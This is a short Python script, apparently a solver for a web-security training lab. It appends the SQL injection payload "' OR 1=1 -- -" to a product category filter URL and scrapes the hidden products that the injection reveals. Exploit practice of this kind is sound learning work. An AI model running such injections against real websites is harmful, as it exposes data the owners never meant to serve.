import requests
import lxml.html

from collections import namedtuple
from time import sleep

from solver.utils import console
from rich.table import Table

ENDPOINT = '/filter?category=Accessories'
PAYLOAD = "' OR 1=1 -- -"

table = Table(title="Hidden Products")
table.add_column("Product Name")
table.add_column("Product Rating")

Product = namedtuple("Product", "name rating")


def fetch_products(payload, server):
    res = []
    response = requests.get(
        str(server)+ ENDPOINT + str(payload) if payload else str(server))

    if response.status_code == 200:
        html_node = lxml.html.fromstring(response.text)
        products = html_node.xpath(
            "//section[@class='container-list-tiles']/div")
        for product in products:
            name = product.xpath("h3")[0].text
            rating = product.xpath("img[2]/@src")[0]
            res.append(Product(name, rating))
        return res
    return []


def main(server):
    with console.status("Fetching all products(ordinary path)..."):
        all_products = fetch_products("", server)
        console.log(f"Fetched {str(len(all_products))}")

    with console.status("Fetching really all products (unexpected products)..."):
        really_all_products = fetch_products(PAYLOAD, server)
        console.log(f"Fetched {str(len(really_all_products))}")

    with console.status("Computing diffetence..."):
        hidden_products = [
            Product for Product in really_all_products if Product not in all_products]
        for product in hidden_products:
            table.add_row(product.name, product.rating)
        console.print(table)
